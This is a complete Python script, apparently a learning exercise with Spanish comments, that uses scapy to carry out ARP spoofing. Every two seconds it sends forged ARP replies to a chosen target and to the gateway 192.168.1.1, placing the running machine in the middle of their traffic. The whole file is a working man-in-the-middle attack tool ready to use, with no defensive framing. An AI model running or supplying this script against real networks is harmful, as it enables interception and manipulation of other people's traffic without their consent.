#!/usr/bin/env python3
"""
ARP Spoofer
"""

import argparse
import signal
import time
import scapy.all as scapy


def def_handler(sig, frame):

    print("\n\n[!] Saliendo del programa...\n")
    exit(1)


signal.signal(signal.SIGINT, def_handler)


def get_arguments():
    """
    Obtiene los argumentos de la línea de comandos
    """

    parser = argparse.ArgumentParser(description='ARP Spoofer')
    parser.add_argument(
        '-t', '--target',
        required=True, dest='ip_address',
        help='Host / IP range to spoof. ex: 192.168.1.1 or 192.168.1.0/24')

    return parser.parse_args()


def spoof(ip_address, spoof_ip):
    """
    Spoofea la dirección IP
    """

    # Construcción del paquete ARP
    arp_packet = scapy.ARP(
        op=2, pdst=ip_address, psrc=spoof_ip, hwdst="00:07:0e:11:22:33"
    )
    # Enviar el paquete
    scapy.send(arp_packet, verbose=False)


def main():
    """
    Función principal
    """

    arguments = get_arguments()

    print("\n[+] Iniciando ARP spoofing...")

    while True:
        spoof(arguments.ip_address, "192.168.1.1")  # Mensaje al target
        spoof("192.168.1.1", arguments.ip_address)  # Mensaje al router

        time.sleep(2)


if __name__ == "__main__":
    main()
